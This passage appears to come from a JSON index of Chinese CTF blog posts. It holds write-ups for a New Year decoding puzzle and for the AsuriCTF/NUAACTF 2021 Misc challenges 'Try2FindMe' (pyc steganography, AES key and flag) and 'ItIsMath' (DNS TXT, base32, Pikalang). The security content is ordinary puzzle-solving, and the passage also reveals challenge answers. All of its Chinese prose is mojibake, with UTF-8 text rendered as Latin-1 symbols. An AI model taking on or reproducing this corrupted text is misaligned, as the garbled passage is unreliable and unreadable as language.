Ì‹Ì¤Ì™Ì¼Í–Ì¦jÍ¨ÌÍ…ÍšuÌ´Í•sÍ¥Í‹Í«ÌÌ“Í›Ì¸Ì°ÌÌ¤Ì«ÌºÌ£tÍ£ÍªÍ‚ÍœÌ–Ìª Í¯Í«Í«aÍ§Í„Ì½ÌÌ‘Í›Ìµ Ì”Ì€Í¯ÌÌ¥Í“Ì¼Ì©Ì­ÍÍ–jÌ½Í›Í‘Í”ÌœoÌ‚Ì Ì kÌ‘ÍªÌŠÍ¦ÍªÌ¬Ì¤Ì¥ÍÌÌªeÌÍ‹Í®Í”Í“Í‡Í–Í‰!Í›Í‚ÍªÍ­Ì‡ÌÍŒÍÌœ ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†âœ…ğŸ”¬ğŸšªğŸğŸŒªğŸ˜ğŸŒ‰ğŸ‘‰ğŸŒğŸ…ğŸ˜†ğŸ’µğŸğŸ˜ğŸ˜ğŸ˜‡ğŸ´â˜ºâ“ğŸğŸ˜†ğŸ˜¡ğŸ˜€â„¹ğŸğŸ¤â˜ƒğŸƒğŸƒğŸ”ªğŸ•¹ğŸ˜¡âœ…ğŸ”ªğŸ˜‚ğŸ¥‹ğŸ…â˜ƒğŸ‘‘â˜€ğŸš°ğŸ¹ğŸ¤ğŸµğŸ˜€âœ…ğŸ•¹ğŸŒâŒ¨ğŸ˜ğŸ’µğŸŒ‰â˜‚ğŸˆğŸ˜ğŸ…â˜€ğŸµğŸš°ğŸ“‚ğŸ˜ŠğŸ˜ğŸ¥‹â©ğŸ˜‚ğŸšªğŸ˜‚ğŸ’µğŸ˜ğŸ˜â©ğŸğŸ˜‡ğŸ˜†ğŸ‘‘âœ‰ğŸŒ¿â˜ƒğŸ˜ŠğŸ˜†â˜ƒğŸ¹ğŸ™ƒğŸ‘£ğŸğŸ”ªğŸâ©ğŸµâœ…ğŸ˜‚ğŸŒğŸ˜‡âœ–â„¹ğŸšªğŸŒğŸ˜¡ğŸ¤£ğŸ‘‰â“ğŸ¹ğŸğŸŒ¿ğŸ›©ğŸ˜¡ğŸ‘‘ğŸ‘‘ğŸ¤ğŸ‘‘â©âœ‰ğŸµğŸ¦“ğŸ‘£ğŸğŸ¥‹ğŸ‘‘ğŸ™ƒğŸ…âŒ¨ğŸŒ¿ğŸ’§ğŸŒŠğŸŒğŸˆğŸğŸ›©ğŸŒŠğŸš°ğŸƒğŸ”¬âœ–ğŸµğŸ™ƒğŸ–âœ…ğŸ¤ğŸ‘£âŒ¨ğŸ—’ğŸ—’ ä¸Šé¢å¥½å¤šå¥‡å¦™çš„ Unicode å­—ç¬¦ï¼Œä¸‹é¢å¾ˆæ˜æ˜¾æ˜¯ emoji-aesï¼Œé‚£ä¹ˆ key æ˜¯å•¥å‘¢ï¼Ÿ ä¼šä¸ä¼šè—åœ¨è¿™å † Unicode é‡Œå•Šï¼Ÿä»”ç»†çœ‹äº†çœ‹ï¼Œæ²¡æœ‰å•Šâ€¦â€¦ åˆåœ¨æƒ³ï¼Œæ˜¯ jokeï¼Ÿä¸æ˜¯ã€‚ æ˜¯ WHOï¼Ÿä¸æ˜¯ã€‚ çªç„¶ä¸€æƒ³ï¼Œè‰ï¼Œ é‚£ä¸å°±æ˜¯ä»–å˜›ï¼æ˜¯ GZTimeï¼ ï¼ˆè¿˜æ³¨æ„å¤§å°å†™å‘¢ cHJvZFsvGQddFBVwexVDZg4VeFZjFXgSVRVscHsWeXR7FRREc3pWbk16SU5tQQpqclZTUk5IY1pPVwpib1dlQhwq Step 4ç»§ç»­ base64 è§£å¯† prod[/..]..p{.Cf..xVc.x.U.lp{.yt{..DszVnMzINmA jrVSRNHcZOW boWeB.* å—¯ï¼Ÿè¿™æ˜¯ä»€ä¹ˆï¼Ÿ è¾“å‡ºäº† . æ˜¯å› ä¸ºé‚£ä¸æ˜¯ ASCII å¯æ‰“å°å­—ç¬¦ï¼Œhexdump çœ‹ä¸€çœ¼ã€‚ 00000000 70 72 6f 64 5b 2f 19 07 5d 14 15 70 7b 15 43 66 |prod[/..]..p{.Cf| 00000010 0e 15 78 56 63 15 78 12 55 15 6c 70 7b 16 79 74 |..xVc.x.U.lp{.yt| 00000020 7b 15 14 44 73 7a 56 6e 4d 7a 49 4e 6d 41 0a 6a |{..DszVnMzINmA.j| 00000030 72 56 53 52 4e 48 63 5a 4f 57 0a 62 6f 57 65 42 |rVSRNHcZOW.boWeB| 00000040 1c 2a |.*| HINT 5: prod[]ä¸åé¢æ˜¯åˆ†ç¦»çš„ prod æ˜¯å•¥ï¼Ÿï¼Ÿï¼Ÿ productionï¼Ÿç”Ÿäº§ç¯å¢ƒï¼Ÿä¸åƒã€‚ é—®äº†ä¸‹ GZTimeï¼Œè¯´æ˜¯ä¹˜ç§¯ï¼Œä¹Ÿå°±æ˜¯ $\\LaTeX$ é‡Œçš„ $\\prod$ äºæ˜¯æƒ³ç€æ˜¯ä¸æ˜¯åé¢é‚£å †æ˜¯ä¹˜ä¸Šå‰é¢è¿™ä¸ªæ•°ï¼Œæˆ–è€…ç›¸é™¤å†æˆ–è€…æ€ä¹ˆç€ã€‚ é‚£æ€ä¹ˆè¯»å–çš„å‘¢ï¼Ÿæ˜¯å½“æˆä¸€æ•´ä¸ª byteï¼Œbytes è½¬ int è¿˜æ˜¯ï¼Ÿ å…ˆä¸ç®¡å§ï¼Œå†™ä¸ªè„šæœ¬éƒ½è¯•è¯•ã€‚ import base64 s = \"cHJvZFsvGQddFBVwexVDZg4VeFZjFXgSVRVscHsWeXR7FRREc3pWbk16SU5tQQpqclZTUk5IY1pPVwpib1dlQhwq\" r = base64.b64decode(s) print(r) x = r.split(b']')[1] prod = r.split(b']')[0].split(b'[')[1] print(x) print(prod) prod = int.from_bytes(prod, byteorder='big') y = int.from_bytes(x, byteorder='big') print(prod, y) z = y * prod d = bytes.fromhex(hex(z)[2:]) print(d) print(base64.b64encode(d)) ç»“æœè·‘å‡ºæ¥å”¯ä¸€ä¸€ä¸ªæ²¡æŠ¥é”™çš„ï¼Œçœ‹ä¸Šå»å•¥ä¹Ÿä¸æ˜¯â€¦â€¦ æœ€åå¾ˆè¿·èŒ«ï¼Œé—®äº†ä¸€ä¸‹ã€‚ å…·ä½“ä¸Šåº”è¯¥æ˜¯é‚£ä¸‰ä¸ª bytes é€å­—èŠ‚ç›¸ä¹˜ã€‚ prod = 0x07*0x19*0x2f # 8225 ä¹Ÿå°±æ˜¯ 0x2021ï¼Œå™¢ï¼Œå°±æ˜¯è¿™ä¸ªå•¦ï¼ è¿™ä¸ªåé¢ä¹Ÿæ”¾äº† hint HINT 6: å¦‚æœä½ å¾—åˆ°äº†Keyï¼Œä½ ä¼šçŸ¥é“ä¸€å®šæ˜¯å®ƒçš„ é‚£æœ€åå’‹å¼„ï¼Ÿè¿˜æœ‰ä¸ª hint æ²¡ç”¨åˆ°ã€‚ HINT 3: ä»¥åŠæœ‰ä¸€æ¬¡ä¼šç”¨åˆ° xor åŠ å¯† å¥½ï¼Œç»ˆäºæœ‰éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦çš„äº†ã€‚ 44PZ5bF/5YvB5Y2t5MPZ6XTZ55dRZwNlZhnLa+JSvrrohBznw+BNwDb= Step 5æ¢è¡¨ base64ï¼Œæˆ–è€…è¯´æ˜¯ ROT13 + base64 ã€Œæ„¿ä¸ä½ åŒè¡Œçš„2022æ˜Ÿå…‰ç›¸éšã€ å¥½è€¶ï¼ç»ˆäºå‡ºäº†ï¼ çˆ±å•¦ï¼ å°ç»“è™½ç„¶ä½†æ˜¯ï¼Œæ€ä¹ˆè¿™ä¹ˆå¥—å•Šï¼Œè¿™åšå¾—å’‹å¿ƒæƒ…è·Œå®•èµ·ä¼çš„â€¦â€¦ å¥½æƒ³æ‰“ GZTime å•Šï¼ˆ é¡ºä¾¿ï¼Œçœ‹äº†ä¸‹æ˜¯äºŒè¡€ï¼Œæ€»å…±ä¹Ÿåªæœ‰ä¸¤è§£ hhh ä¸è¿‡æ¯•ç«Ÿæ˜¯å¾ˆå°èŒƒå›´çš„è§£è°œï¼Œä¹Ÿå°±è¿™æ ·å•¦ã€‚ æ„Ÿè°¢ GZTime çš„å‡ºé¢˜ï¼Œè¾›è‹¦äº†ï¼ˆè´´è´´ï¼ æœ€åï¼Œ2022 å•¦ï¼Œç¥å¤§å®¶æ–°å¹´å¿«ä¹å–µ~ æ–°çš„ä¸€å¹´é‡Œå¸ˆå‚…ä»¬ä¹Ÿè¦å¤šå¤šå¸¦å¸¦å–µå–µå‘€ï¼ æ°´å®Œäº†ï¼Œç»§ç»­èµ¶æœŸæœ« ddl å»äº†ï¼Œå–µå‘œï¼ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2022/01/01/CTF_2022GZTime0101/"},{"title":"CTF | 2021 AsuriCTF / NUAACTF Misc éƒ¨åˆ†å®˜æ–¹ WriteUp","text":"å¼•è¨€ ç¬¬å…­å±Šå—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ç½‘ç»œæ”»é˜²å¤§èµ› AsuriCTF / NUAACTF 2021 æ‰¿åŠå•ä½ï¼šç”±å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ä¿¡æ¯åŒ–å¤„ã€å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦æ•™åŠ¡å¤„ã€å…±é’å›¢å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦å§”å‘˜ä¼šæŒ‡å¯¼ï¼Œå—äº¬èˆªç©ºèˆªå¤©å¤§å­¦è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯å­¦é™¢æ‰¿åŠï¼ŒAsuriä¿¡æ¯å®‰å…¨æˆ˜é˜Ÿï¼Œå—äº¬èˆªç©ºèˆªå¤©å¤§å­¦å­¦ç”Ÿç½‘ç»œå®‰å…¨ä¸ä¿¡æ¯æŠ€æœ¯åä¼šååŠï¼Œå¥‡å®‰ä¿¡ç§‘æŠ€é›†å›¢è‚¡ä»½æœ‰é™å…¬å¸ç‹¬å®¶èµåŠ©ã€‚ æ´»åŠ¨å¯¹è±¡ï¼šå—äº¬èˆªç©ºèˆªå¤©å¤§å­¦å…¨ä½“å­¦ç”Ÿï¼Œæ ¡å¤–å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£çš„åŒå­¦ã€‚ æŠ¥åæ—¶é—´ï¼š2021å¹´11æœˆ22æ—¥0:00-12æœˆ6æ—¥12:00 æ¯”èµ›æ—¶é—´ï¼š2021å¹´12æœˆ11æ—¥13:00-18:00ï¼ˆæœ€åå®é™…æ˜¯åˆ° 19:00ï¼‰ åˆåˆ°æ ¡èµ›äº†å•Šï¼Œæƒ³æƒ³ä¸Šä¸€æ¬¡æ ¡èµ›è¿˜æ˜¯ ä¸Šæ¬¡ï¼Œå•Šæ˜¯ä»Šå¹´ä¸ŠåŠå¹´ï¼Œå¥½åƒæ˜¯å› ä¸ºç–«æƒ…å»¶æœŸäº†ã€‚ ç”±äºè¿™å­¦æœŸå¼€å­¦åŠäº†ä¸ª SharkCTF æ–°ç”Ÿèµ›ï¼Œè¿™æ¬¡çš„è¯é¢˜ç›®ç›¸å¯¹è€Œè¨€å°±ä¼šéš¾ä¸€äº›ï¼Œæ¯•ç«Ÿè¿˜æ˜¯å¯¹å¤–åŠäº†ï¼Œè€Œä¸”è¿˜æœ‰å¥‡å®‰ä¿¡é‡‘ä¸»çˆ¸çˆ¸èµåŠ©æ˜¯å§ã€‚ ï¼ˆè‰ï¼Œä¸ºå•¥å‡ºé¢˜äººæ— å¿å‡ºé¢˜å•¥ä¹Ÿæ²¡æœ‰ï¼Œå¯æ¶ å–µå–µè™½ç„¶ å·²ç»è·‘è·¯äº†ï¼Œä½†è¿˜æ˜¯æ¥å‡ºäº†ä¸¤é“ Misc ç±»å‹çš„é¢˜ç›®ï¼Œæœ€åæ¯”ä¸‹æ¥æ¯é“é¢˜éƒ½åªæœ‰1ä¸ªæ ¡å¤–é˜Ÿä¼è§£å‡ºæ¥äº†ï¼Œå¯èƒ½è¿˜æ˜¯æœ‰ç‚¹éš¾å§ã€‚ ä¸‹é¢å°±æ˜¯ Try2FindMe å’Œ ItIsMath ä¸¤é“é¢˜ç›®çš„å®˜æ–¹é¢˜è§£ã€‚ Try2FindMe 1 solve, 1000 pts å–µå–µèƒ½æœ‰ä»€ä¹ˆç§˜å¯†å‘¢ï¼Ÿå¿«æ¥æ‰¾ä¸€æ‰¾å§ï¼ é™„ä»¶åœ°å€ï¼š https://www.lanzouw.com/iMbHaxgzqvg Hint1: å˜»å˜»ï¼Œå¦‚æœå·®ä¸€åŠ key çš„è¯ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œæœ‰éšå†™ï¼ Hint2: pyc éšå†™ python 3.7.11 Hint3: æœ€åçš„ AES è·‘ä¸å‡ºæ¥å¯èƒ½æ˜¯ python ä¾èµ–ç‰ˆæœ¬ä¸ä¸€æ ·å¯¼è‡´é”…äº†ï¼Œé—®é¢˜ä¸å¤§ï¼Œæ‰¾ä¸ªåœ¨çº¿çš„ AES è§£å¯†å°±è¡Œ è§£é¢˜æ­¥éª¤å¼€å±€æ˜¯ä¸€å¼ çŒ«çŒ«å›¾ã€‚ å›¾ç‰‡ç§ï¼Œbinwalk / foremost / äººå·¥æ‰‹åŠ¨åˆ†ç¦»å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°ä¸€ä¸ª 1.pycã€‚ pyc å­—èŠ‚ç åç¼–è¯‘å¯ä»¥ç”¨ uncompyle6 æˆ–è€… decompyle3 uncompyle6 -o 1.py 1.pyc ç”šè‡³è¿™é‡Œå¯ä»¥ç”¨ åœ¨çº¿çš„åç¼–è¯‘ï¼ˆ æºç å¦‚ä¸‹ from Crypto.Cipher import AES import binascii def decrypt(x, cipher): key = x + 'n0lve3t6r1s' try: aes = AES.new(key.rjust(24, 'A'), AES.MODE_ECB) cipher = binascii.unhexlify(cipher) flag = aes.decrypt(cipher).decode() return flag except: return '' def main(): c = '29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805' k = input('Please input your key: ') flag = decrypt(k, c) if 'flag' in flag: print('Wow, you find it!!!') else: print('Oh no!!!') if __name__ == '__main__': main() å‘ç°è¿˜å·®äº† AES åŠ è§£å¯†ç”¨åˆ°çš„ key çš„ä¸€éƒ¨åˆ†ã€‚ æ ¹æ®æç¤ºï¼Œè€ƒè™‘æ˜¯ pyc éšå†™ https://github.com/AngelKitty/stegosaurus ç„¶è€Œç›´æ¥è·‘å¯èƒ½ä¼šè·‘ä¸å‡ºæ¥ï¼Œä¼šæŠ¥é”™ ValueError: bad marshal data äºæ˜¯åˆæ ¹æ®æç¤ºæ˜¯ python 3.7.11ï¼ˆå…¶å®å¯ä»¥çœ‹ magic numberï¼‰ï¼Œæ˜¯é«˜ç‰ˆæœ¬çš„ python äº†ï¼Œæ ¹æ®ç»éªŒ header é•¿åº¦æ˜¯ 16. äºæ˜¯æ ¹æ®æŠ¥é”™çš„æç¤ºé­”æ³•æ”¹ä¸€æ”¹ç¬¬124è¡Œè¿™é‡Œã€‚ è¿è¡Œå¾—åˆ°éšå†™çš„ç»“æœ $ python3 stegosaurus.py 1.pyc -x Extracted payload: bytearray(b'k5fgb2eur5sty') cipher: 29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805 input ä¸º pyc éšå†™çš„ k5fgb2eur5sty ç›´æ¥è¿è¡Œ py / pyc éœ€è¦ Crypto åº“ï¼Œæœ€å¥½ç”¨ pyenv æ–°å»ºä¸€ä¸ª python 3.7.11 çš„è™šæ‹Ÿç¯å¢ƒï¼Œç„¶ååœ¨é‡Œé¢è£…ã€‚ pip3 install pycryptodome æ¯”èµ›çš„æ—¶å€™æœ‰é€‰æ‰‹åé¦ˆè·‘å‡ºæ¥å‘ç°è¿˜æ˜¯ Oh no!!!ï¼Œçœ‹äº†ä¸€ä¸‹å‘ç°å¯èƒ½æ˜¯ python ä»¥åŠä¾èµ–ç‰ˆæœ¬ä¸å¯¹åº”ï¼Œstr å¤„ç†çš„æ—¶å€™å‡ºäº†ç‚¹é”…ã€‚ äºæ˜¯æ”¾äº†ä¸ª hint è¯´å¯ä»¥æ‰¾ä¸ªåœ¨çº¿å·¥å…·æ¥è§£ã€‚ æŒ‰ç…§ä»£ç çš„æ„æ€æ‹¼æ¥å¾—åˆ° AES key: k5fgb2eur5styn0lve3t6r1s æœ€å AES ECB è§£å¯†å¾—åˆ° flag flag{M15c_1s_r34l1y_fuNny_ha233} ï¼ˆè¿™é‡Œç”¨çš„æ˜¯ http://aes.online-domain-tools.com/ å‡ºé¢˜æ€è·¯æ ¡èµ›æ¥äº†ï¼Œè¦å‡ºé¢˜äº†ï¼Œçœ‹é˜Ÿé‡Œå…¶ä»–å¸ˆå‚…å‡ºäº†æ¯”è¾ƒå¸¸è§„çš„ LSBã€emoji-aesã€baseç¼–ç ã€å‹ç¼©åŒ…ä¼ªåŠ å¯†ã€éŸ³é¢‘éšå†™ä»€ä¹ˆçš„ï¼Œä»¥åŠã€Šæˆ‘ä»¬ç”Ÿæ´»åœ¨å—äº¬ã€‹ç³»åˆ—æ— çº¿ç”µçš„é¢˜ç›®ï¼Œåœ¨æƒ³å’±å‡ºç‚¹ä»€ä¹ˆæ¯”è¾ƒå¥½å‘¢ã€‚ ä¸€æƒ³ï¼Œä»Šå¹´å¼ºç½‘æ¯çº¿ä¸Šèµ›çš„æ—¶å€™å°± æœ‰ä¸€é“åå« ExtremelySlow çš„é¢˜ç›®åŒ…å«äº† pyc éšå†™ï¼Œå½“æ—¶ç”¨åˆ°çš„æ˜¯ python 3.10ï¼Œç”±äºç°æˆçš„åç¼–è¯‘å·¥å…·è¿˜ä¸æ”¯æŒé‚£ä¹ˆé«˜ç‰ˆæœ¬ç›´æ¥è¿˜åŸå‡º python æºç ï¼Œå’Œé˜Ÿå‹æ‰‹é€†ç‰¹åˆ«è¾›è‹¦ï¼ˆæ‘Šæ‰‹.jpg äºæ˜¯å°±å‡ºä¸€é¢˜ pyc éšå†™å§ï¼ ä½†æ˜¯æ¯•ç«Ÿæ˜¯æ ¡èµ›ï¼Œä¸æƒ³å‡ºå¾—å¤ªéš¾ï¼Œå°±æ²¡è€ƒè™‘ç”¨ç‰¹åˆ«é«˜ç‰ˆæœ¬çš„ Pythonï¼Œæ¯”å¦‚ Python 3.9 3.10 é‚£ç§ç‰ˆæœ¬ï¼Œæœ€åæ˜¯æ•´äº†ä¸ª python3.7.11 è¿™ä¸ªç›¸å¯¹è€Œè¨€æ¯”è¾ƒæ–°çš„ç‰ˆæœ¬ã€‚è¿™æ ·çš„è¯ä¸éœ€è¦é€‰æ‰‹æ‰‹é€† pycï¼Œä½†æ˜¯ stegosaurus ä¸èƒ½ç›´æ¥ç”¨éœ€è¦é­”æ”¹ï¼Œè€ƒç‚¹å°±åœ¨è¿™é‡Œäº†ã€‚ æ¯”èµ›çš„æ—¶å€™æ ¡å†…ä¹Ÿæœ‰å‡ é˜ŸæŠŠ pyc åç¼–è¯‘å¥½äº†ï¼Œä¹ŸçŸ¥é“ç”¨ stegosaurus éšå†™çš„äº†ï¼Œä½†è¿˜æ˜¯å¡åœ¨è¿™ä¸ªé­”æ”¹ header é•¿åº¦ä¸Šäº†ã€‚æ ¡å¤–çš„è¯ Z å¸ˆå‚…å‘ç°äº†è¿™ä¸ªé—®é¢˜æ”¹äº†ä¹‹åæˆåŠŸå¾—åˆ°äº†éšå†™çš„å¯†é’¥ï¼Œä¸è¿‡å‘ç°è·‘ä¸é€šï¼Œæ‰€ä»¥æœ€åæ”¾äº†ä¸ªæç¤ºè¯´å¯ä»¥æ‹¿åœ¨çº¿å·¥å…·æ¥äº†ã€‚ ItIsMath 1 solve, 1000 pts It is math, but it is not only math. Maybe you can find something in the domain itismath.asurictf2021.miaotony.xyz Do you remember the last NUAACTF? Update: The domain is changed to itismath2.asurictf2021.miaotony.xyz Hint1: domain TXT Hint2: Update: The domain is changed to itismath2.asurictf2021.miaotony.xyz åŸåŸŸåå¾—åˆ°å«æœ‰ ctf.asuri.club çš„å­—ç¬¦ä¸²å¯ä»¥æ‰¾å‡ºé¢˜äººæ¢æ–‡ä»¶ Hint3: çº¿æ€§å›å½’ è§£é¢˜æ­¥éª¤è¿™é‡Œçœ‹æ›´æ–°åçš„åŸŸåå§ã€‚ é¦–å…ˆè¿™ä¸ªåŸŸåæ˜¯è®¿é—®ä¸äº†çš„ï¼Œæ¯”èµ›ç¾¤é‡Œæœ‰é€‰æ‰‹é—®äº†ï¼Œå›å¤äº†è¯´æ˜¯æ­£å¸¸çš„ã€‚å½“ç„¶è¿›ä¸€æ­¥çœ‹å‘ç°ç”šè‡³æ²¡æœ‰Aã€AAAAè§£æã€‚ é‚£è‡ªç„¶æƒ³åˆ°æ˜¯ TXT è§£æäº†ï¼Œåé¢ä¹Ÿæ”¾äº† hintã€‚ $ dig itismath2.asurictf2021.miaotony.xyz TXT +short @1.0.0.1 | sed 's/[\" ]//g' OBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUWWYJAOBUXA2JAOBUSA4DJOBUSA4DJEBYGSIDQNEQHA2LQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJMNUHKIDQNFRWQ5JAOBUWG2DVEBYGSY3IOUQGWYJAMNUHKIDQNFYGSIDQNFYGSIDQNFYGSIDQNFYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUWWYLDNB2SA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBYGS23BMNUHKIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA4DJNNQWG2DVEBYGSY3IOUQHA2LDNB2SA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGS23BMNUHKIDQNFYGSIDQNFYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGS23BMNUHKIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2LLMFRWQ5JANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA4DJEBYGSIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJNNQWG2DVEBYGSY3IOUQHA2LDNB2SA4DJNNQWG2DVEBYGS4DJEBYGS4DJEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2LLMFRWQ5JAOBUWWYLDNB2SA=== å¾ˆæ˜æ˜¾æ˜¯ base32ï¼Œè§£å¯†ä¸€ä¸‹ $ dig itismath2.asurictf2021.miaotony.xyz TXT +short @1.0.0.1 | sed 's/[\" ]//g' | base32 -d pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu pichu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pipi pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pikachu pi pi pi pi pi pi pi pikachu pichu pichu pikachu pipi pipi ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pikachu å•Šï¼Œæ˜¯ä¸€å †çš„ pikachuï¼ äºæ˜¯æƒ³åˆ°æ˜¯ Pikalang / pikalang-languageï¼Œè¿™ä¸ªæ¯”èµ›çš„æ—¶å€™ä¹Ÿåœ¨æ¯”èµ›ç¾¤é‡Œæ”¾äº† hintã€‚ Tool for decoding / encoding in Pikalang. Pikalang (or Pikachu language) is a minimalist programming language based on the Brainfuck for which it substitutes the signs by the syllables of Pikachu. Pikalang is a programming language based on the BrainFuck language but whose operators are substituted by the cries of the Pokemon Pikachu. Thus, from a code written in BrainFuck, the following table helps to match the code in Pikalang: + pi - ka &gt; pipi &lt; pichu [ pika ] chu . pikachu , pikapi Example: The Pikalang program pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pi pi pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka pikachu ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pi pi pikachu ka pikachu corresponds to BF code ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++.&gt;+++++++++++.----.------.++++++++.++.-. and should output the ASCII characters Pokemon å…¶å®å°±æ˜¯ BrainFuck æ¢äº†ä¸ªç¼–ç è¡¨ï¼ˆ ç›´æ¥åœ¨ç½‘é¡µä¸Šæ‰§è¡Œï¼Œå¾—åˆ°å¦ä¸€ä¸ªåŸŸå itismath.vercel.app è®¿é—®å¾—åˆ°ä¸€å †æ•°å­—ï¼Œæˆ–è€…è¯´ä¸€ä¸ªçŸ©é˜µã€‚ [(251, 25711.438), (393, 40195.541), (177, 18162.627), (318, 32544.988), (471, 48151.807), (170, 17448.789), (469, 47947.733), (428, 43765.255), (65, 6738.41), (291, 29790.762), (350, 35809.283), (151, 15510.828), (203, 20815.487), (196, 20101.064), (228, 23365.239), (34, 3576.204), (150, 15408.508), (53, 5514.259), (392, 40092.417), (212, 21732.801), (226, 23160.389), (362, 37032.44), (314, 32137.56), (283, 28975.046), (437, 44683.716), (463, 47335.627), (176, 18060.901), (182, 18672.449), (245, 25098.485), (322, 32953.074)] [(315, 30659.028), (79, 7766.519), (349, 33957.654), (294, 28622.323), (399, 38806.382), (40, 3983.567), (54, 5341.251), (313, 30464.785), (135, 13198.723), (483, 46955.973), (391, 38032.457), (71, 6990.395), (51, 5050.41), (311, 30271.461), (457, 44432.214), (392, 38128.872), (320, 31143.177), (258, 25129.776), (472, 45887.894), (18, 1849.403), (206, 20085.75), (442, 42978.708), (195, 19018.715), (74, 7281.578), (306, 29785.452), (116, 11355.545), (491, 47730.532), (172, 16787.549), (52, 5147.612), (316, 30756.23)] [(418, 51471.916), (432, 53194.178), (67, 8298.618), (470, 57869.16), (473, 58237.061), (78, 9651.542), (350, 43108.093), (24, 3009.174), (57, 7068.255), (45, 5592.309), (132, 16293.547), (312, 38433.309), (111, 13710.512), (196, 24165.246), (162, 19983.339), (113, 13956.568), (249, 30685.306), (466, 57377.563), (76, 9405.55), (456, 56145.491), (381, 46920.932), (32, 3993.124), (61, 7560.342), (22, 2763.37), (200, 24657.32), (332, 40895.039), (20, 2517.183), (339, 41754.346), (7, 918.143), (427, 52579.973)] [(491, 33442.231), (458, 31197.978), (175, 11952.617), (415, 28273.888), (59, 4064.374), (384, 26165.806), (461, 31401.368), (114, 7804.803), (298, 20316.548), (259, 17665.479), (7, 528.412), (314, 21404.044), (256, 17460.416), (353, 24056.761), (243, 16577.595), (422, 28748.164), (332, 22628.649), (421, 28681.826), (313, 21337.49), (156, 10660.488), (202, 13789.358), (198, 13516.644), (151, 10320.372), (216, 14741.23), (291, 19841.042), (288, 19637.266), (425, 28954.543), (91, 6240.096), (434, 29565.843), (355, 24192.317)] [(72, 7400.724), (79, 8114.246), (179, 18314.96), (322, 32901.375), (433, 44223.767), (245, 25047.021), (399, 40754.275), (491, 50139.317), (125, 12806.721), (182, 18620.374), (259, 26475.651), (325, 33207.992), (463, 